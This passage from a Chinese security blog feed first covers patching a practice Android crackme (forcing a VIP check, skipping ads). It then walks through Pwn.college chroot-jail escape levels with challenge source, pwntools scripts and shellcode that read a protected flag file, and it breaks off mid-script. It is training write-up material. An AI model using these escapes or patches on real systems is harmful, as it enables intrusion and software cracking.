修改寄存器</h3><p>​这里长按 <code>isvip()Z</code> 的判断，修改最后的返回值 <code>v0</code>为0x1， 然后就可以通过检测</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402251128828.png" alt="image-20240225112822729" /></p><h2 id="第三关"><a class="markdownIt-Anchor" href="#第三关"></a> 第三关</h2><h3 id="启动广告"><a class="markdownIt-Anchor" href="#启动广告"></a> 启动广告</h3><p>​启动广告流程：启动Activity-&gt;广告Activity-&gt;主页Activity。所以可以修改加载时间，或者直接修改Acitivity切换定位，修改Intent的Activity类名</p><h4 id="修改加载时间"><a class="markdownIt-Anchor" href="#修改加载时间"></a> 修改加载时间</h4><p>​直接启动 MT管理器的 <code>Activity记录</code> 功能，然后获得广告启动的activity：<code>com.zj.wuaipojie.ui.AdActivity</code>，之后在dex文件中搜索类名，获取位置，然后修改3000为0(注意只能修改smail代码)即可直接跳过广告。</p><h4 id="修改切换定位"><a class="markdownIt-Anchor" href="#修改切换定位"></a> 修改切换定位</h4><p>​在MT管理器中搜索<code>com.zj.wuaipojie.ui.AdActivity</code>，之后长按复制smail代码的名称<code>Lcom/zj/wuaipojie/ui/AdActivity;</code>，之后将这个作为代码进行搜索，查看什么调用了这个代码，然后发现<code>com.zj.wuaipojie.ui.Adapter.ChallengeAdapter</code>类调用这个代码，发现使用switch来进行切换，这里直接将AdActivity改为ChallengeThrid即可，这样就跳过了广告。(补充：这里也可以直接通过修改xml上面的<code>AdActivity</code>为<code>ChallengeThird</code>来通过)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402251153187.png" alt="image-20240225115316143" /></p><h3 id="弹窗广告"><a class="markdownIt-Anchor" href="#弹窗广告"></a> 弹窗广告</h3><h4 id="更新弹窗"><a class="markdownIt-Anchor" href="#更新弹窗"></a> 更新弹窗</h4><p>​修改 <code>android:versionCode=&quot;1&quot;</code> 为2即可去除</p><h4 id="一号与二号弹窗"><a class="markdownIt-Anchor" href="#一号与二号弹窗"></a> 一号与二号弹窗</h4><p>​这里使用算法助手进行弹窗hook(首先需要在LSPosed中启动模块与对应程序)，找到弹窗的方法，并使用NP管理器在dex中寻找方法名(com.zj.wuaipojie.ui.ChallengeThird.onCreate方法)找到指定位置，之后注释掉用于弹窗展示的<strong>show</strong>方法即可</p><h4 id="图片广告"><a class="markdownIt-Anchor" href="#图片广告"></a> 图片广告</h4><p>​使用开发助手定位资源ID，然后在NP管理器中搜索相应XML资源，之后定位到具体的xml代码，可以修改宽高为0来隐藏弹窗，或者可以直接添加<code>android:visibility=&quot;gone&quot;</code>对内容进行隐藏</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402251614258.png" alt="image-20240225161436167" /></p><h2 id="第四关"><a class="markdownIt-Anchor" href="#第四关"></a> 第四关</h2><p>​首先找到关键的 <code>check</code> 方法，之后下断点进行调试，进入<code>invoke-virtual Base64Utils-&gt;encodeToString([B)String, v1, v0</code>，之后查看赋值后的 v0 的值，即为flag。这里需要注意调试的时候有很多bug，需要进入方法内才能看到返回值。</p><p>​或者使用 log 插桩方法，具体看这个-&gt;<a href="https://www.52pojie.cn/thread-1714727-1-1.html">《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><h1 id="参考-7"><a class="markdownIt-Anchor" href="#参考-7"></a> 参考</h1><ul><li><a href="https://www.52pojie.cn/home.php?mod=space&amp;uid=1109458&amp;do=thread&amp;view=me&amp;from=space">正己的帖子 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn.college(3)</title>
    <link href="/posts/a9b269a3.html"/>
    <url>/posts/a9b269a3.html</url>
    
    <content type="html"><![CDATA[<h1 id="sandboxing"><a class="markdownIt-Anchor" href="#sandboxing"></a> Sandboxing</h1><h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2><h3 id="chroot"><a class="markdownIt-Anchor" href="#chroot"></a> chroot</h3><ul><li><p>change root directory，它用来在指定的根目录下运行程序，简单而言就是将自己指定的目录替换 linux 中默认的 <code>/</code> 根目录，更改进程及其子进程的根目录。</p><ul><li><p><code>chroot(&quot;tmp/jail&quot;)</code> 将根目录设置为 <code>/tmp/jail</code> ，它创建了一个jail，从而使在这个shell下，我们只能访问这个目录中的内容，形成了一个沙盒</p></li><li><p>注意：不使用 <code>chdir('/')</code> 的话并不能真正进入 jail，会产生逃逸，这个时候还可以使用 <code>../../file</code> 来查找 jail 以外的数据</p></li><li><pre class="highlight"><code class="c"># 这时正常用法chroot(<span class="hljs-string">&quot;/tmp/jail&quot;</span>);chdir(<span class="hljs-string">&quot;/&quot;</span>);&lt;!--code￼<span class="hljs-number">0</span>--&gt;</code></pre></li><li><p>同时 linux kernel 不会跟踪进程的先前 chroot，也就是说，我们可以在监狱内再次使用 <code>chroot</code>，然后它会覆盖之前的 chroot</p></li></ul></li></ul><h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2><h3 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE 1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sendfile.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    assert(argc &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;### Welcome to %s!\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The only thing you can do in this challenge is read out one single file, as specified by the first argument to the&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;program (argv[1]).\n&quot;</span>);<br><br>    assert(argc &gt; <span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">char</span> jail_path[] = <span class="hljs-string">&quot;/tmp/jail-XXXXXX&quot;</span>;<br>    assert(mkdtemp(jail_path) != <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Creating a jail at `%s`.\n&quot;</span>, jail_path);<br><br>    assert(chroot(jail_path) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> fffd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);<br>    write(fffd, <span class="hljs-string">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class="hljs-number">10</span>);<span class="hljs-comment">// 写入假flag文件</span><br>    close(fffd);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sending the file at `%s` to stdout.\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>    sendfile(<span class="hljs-number">1</span>, open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>), <span class="hljs-number">0</span>, <span class="hljs-number">128</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>​这个程序就是通过 <code>assert(chroot(jail_path) == 0);</code> 来创建 jail，但是不使用 <code>chdir('/');</code> 就没有作用，所以可以直接逃逸。这里的方法就是关注 <code>sendfile(1, open(argv[1], 0), 0, 128);</code>，它在这个 jail 中打开一个文件，可以推测传输的参数应该需要是真正根目录下的flag。这里分析一下 <code>argv[1]</code> 的不同情况：</p><ul><li>如果为 <code>/flag</code>, 那么这个路径会被解析为 <code>/tmp/jail-XXXXXX/flag</code> ，这时假flag的路径</li><li>如果为 <code>flag</code>，那么这个结果取决于我们执行脚本的当前工作目录。我们可以在启动流程时设置一个参数 <code>cwd='/'</code> 来逃逸</li><li>同时还可以使用路径遍历。如果 <code>argv[1]</code> 为 <code>../../flag</code> ，也可以进行逃逸。但是使用 <code>./flag</code> 和 <code>../flag</code> 也可以成功(在 <code>/</code> 目录下执行 <code>/challenge/babyjail_level1 ../flag</code>)，所以估计这里是因为没有使用chdir，直接执行的当前目录不是 <code>/tmp/jail-XXXXXX</code>，而是<strong>真实的当前目录</strong>，直接根据当前目录来进行路径遍历即可</li><li>还可以使用 <code>openat(AT_FDCWD, &quot;../../flag&quot;, 0, 0)</code>，这里<code>AT_FDCWD=0xffffff9c</code>，代表的是current working directory，所以这里就是以当前目录为 <code>.</code>，打开 <code>../../flag</code>，没有chdir的情况可以进行逃逸</li><li><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html">openat与open的区别及用法示例</a></li></ul><h3 id="wp1"><a class="markdownIt-Anchor" href="#wp1"></a> wp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;flag&quot;</span>)<span class="hljs-comment">#binary_paths本身为list类型，所以使用append</span><br>r = process(binary_paths,cwd=<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-comment"># cwd设置当前程序执行的路径</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wp2"><a class="markdownIt-Anchor" href="#wp2"></a> wp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;../../flag&quot;</span>)<span class="hljs-comment">#脚本路径为/home/hacker/c.py，所以向上遍历两次就到达了&#x27;/&#x27;的位置</span><br>r = process(binary_paths)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> level 2</h2><p>​与 level 1的区别就在于没有 <code>sendfile(1, open(argv[1], 0), 0, 128);</code> 了，需要字节写汇编来执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *shellcode = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>assert(shellcode == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x1337000</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;</span>, shellcode);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Reading 0x1000 bytes of shellcode from stdin.\n&quot;</span>);<br><span class="hljs-type">int</span> shellcode_size = read(<span class="hljs-number">0</span>, shellcode, <span class="hljs-number">0x1000</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is about to execute the following shellcode:\n&quot;</span>);<br>print_disassembly(shellcode, shellcode_size);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing shellcode!\n&quot;</span>);<br><br>((<span class="hljs-type">void</span>(*)())shellcode)();<br></code></pre></td></tr></table></figure><p>​这里注意不要写 <code>/flag</code> ，理由就是 level 1中的三种情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;/&quot;</span>)<br>r = process(binary_paths,cwd=<span class="hljs-string">&#x27;/&#x27;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rbx,0x0000000067616c66# open，与之前相比没有了 0x2f-&gt;&#x27;/&#x27;</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov rsi,0</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rdi,1                       # sendfile</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    mov rdx,0</span><br><span class="hljs-string">    mov r10,1000</span><br><span class="hljs-string">    mov rax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,60                  # exit</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>​这里补一个初始的 shellcode，后面会用到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">.global _start<br>.intel_syntax noprefix<br>_start:<br>//fd = open(&quot;../../../../flag&quot;,0)<br>    lea rdi,[rip+flag]<br>    mov rsi,0<br>    mov rax,2<br>    syscall<br>    //read(fd,buf,60)<br>    mov rdi,rax<br>    mov rsi,rsp#buf存储在栈上<br>    mov rdx,60<br>    mov rax,0<br>    syscall<br>    //write(stdout,buf,60)<br>    mov rdi,1<br>    mov rsi,rsp<br>    mov rdx,60<br>    mov rax,1<br>    syscall<br>    //exit(42)<br>    mov rdi,42<br>    mov rax,0x3c<br>    syscall<br>flag:<br>    .string &quot;../../../../flag&quot;<br></code></pre></td></tr></table></figure><h2 id="level-3-4"><a class="markdownIt-Anchor" href="#level-3-4"></a> level 3-4</h2><blockquote><p>知道什么是openat(int dirfd, const char *pathname, int flags, mode_t mode)，然后这个dirfd必须是目录卡了我好长时间</p></blockquote><ul><li><p><code>open()</code>函数直接使用传递给它的路径名参数，这意味着它将相对于当前工作目录打开文件。</p></li><li><p><code>openat()</code>函数接受一个文件描述符参数，以及一个路径名参数。它将路径名解释为相对于由文件描述符指定的目录，而不是当前工作目录。这使得<code>openat()</code>函数更加灵活，并且在多线程或异步I/O环境中更加安全，因为它允许程序员明确地指定打开文件的目录而不必担心在调用之间当前工作目录的改变。此外，<code>openat()</code>也可以用于在chroot环境中安全地打开文件。</p></li></ul><h3 id="源码"><a class="markdownIt-Anchor" href="#源码"></a> 源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"># 打开了一个文件，通过strace可以知道文件描述符为 <span class="hljs-number">3</span><br><span class="hljs-type">int</span> fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY|O_NOFOLLOW);<br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open the file located at `%s`.\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Successfully opened the file located at `%s`.\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br><br><span class="hljs-type">char</span> jail_path[] = <span class="hljs-string">&quot;/tmp/jail-XXXXXX&quot;</span>;<br>assert(mkdtemp(jail_path) != <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Creating a jail at `%s`.\n&quot;</span>, jail_path);<br>assert(chroot(jail_path) == <span class="hljs-number">0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Moving the current working directory into the jail.\n&quot;</span>);<br>assert(chdir(<span class="hljs-string">&quot;/&quot;</span>) == <span class="hljs-number">0</span>);<span class="hljs-comment">//进入了沙箱根目录</span><br></code></pre></td></tr></table></figure><p>​这里通过 <code>openat(3, &quot;../../flag&quot;, 0, 0)</code> 进行逃逸，因为之前使用 open 打开了一个<strong>目录</strong>(这里要求给定的参数为一个目录，比如<code>.</code>，<code>../</code>等)，它的文件描述符为3(这里就要求必须可以打开文件成功)，所以后面的 <code>pathname</code> 就是相对于这个打开文件的路径。利用这种方法可以实现逃逸。最后构造 <code>sendfile(1, openat(3, &quot;../../flag&quot;, 0, 0), 0, 128)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;.&quot;</span>)<span class="hljs-comment">#这里需要是给一个目录，给一个文件就会报错</span><br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">// openat(fd, pathname,flags,mode)</span><br><span class="hljs-string">// openat(3, &quot;../../../../flag&quot;,0,0)</span><br><span class="hljs-string">    mov rdi,3</span><br><span class="hljs-string">    lea rsi,[rip+flag]</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    xor r10,r10</span><br><span class="hljs-string">    mov eax,257</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">//sendfile(1,openat,0,128)</span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov r10,128</span><br><span class="hljs-string">    mov eax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">//exit(42)</span><br><span class="hljs-string">    mov rdi,42</span><br><span class="hljs-string">    mov eax,60                    </span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">flag:</span><br><span class="hljs-string">    .string &quot;../../../../../flag&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>​下面这个 shellcode 也可以，但是有时候读取得东西为不可见字符，很奇怪，尽量用上面sendfile的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">.global _start<br>.intel_syntax noprefix<br>_start:<br>    // openat(fd,&quot;../../../../flag&quot;, 0)<br>    mov rdi,3<br>    lea rsi,[rip+flag]<br>    mov rdi,0<br>    mov rax,257<br>    syscall<br>    //read(fd,buf,50)<br>    mov rdi,rax<br>    mov rsi,rsp<br>    mov rdx,70<br>    mov rax,0<br>    syscall<br>    //write(stdout,buf,50)<br>    mov rdi,1<br>    mov rsi,rsp<br>    mov rdx,70<br>    mov rax,1<br>    syscall<br>    //exit(42)<br>    mov rdi,42<br>    mov rax,0x3c<br>    syscall<br>flag:<br>    .string &quot;../../../../flag&quot;<br></code></pre></td></tr></table></figure><h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2><blockquote><p>int linkat(int efd,const char *existingpath,int nfd,const char *newpath,int flag);</p></blockquote><p>​这里不能用 <code>openat</code> 了，但是可以用 <code>sys_linkat</code> ，这个函数创建一个新目录项 <code>newpath</code> ，它引用现有文件<code>existingpath</code>。 对于linkat函数，现有文件是通过efd和existingpath参数指定的。默认情况下，如果两个路径名中的任意一个是相对路径，那么它需要通过相对于对应的文件描述符进行计算。如果两个文件描述符中的任一个设置为<code>AT_FDCWD</code>，那么相应的路径名（如果它是相对路径）就通过相对于当前目录进行计算。如果任一路径名是绝对路径，相应的文件描述符参数就会被忽略。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;.&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    //linkat(3, &quot;../../../../flag&quot;, 4, &quot;/a&quot;)</span><br><span class="hljs-string">    mov rdi,3</span><br><span class="hljs-string">    lea rsi,[rip+flag]</span><br><span class="hljs-string">    mov rdx,4</span><br><span class="hljs-string">    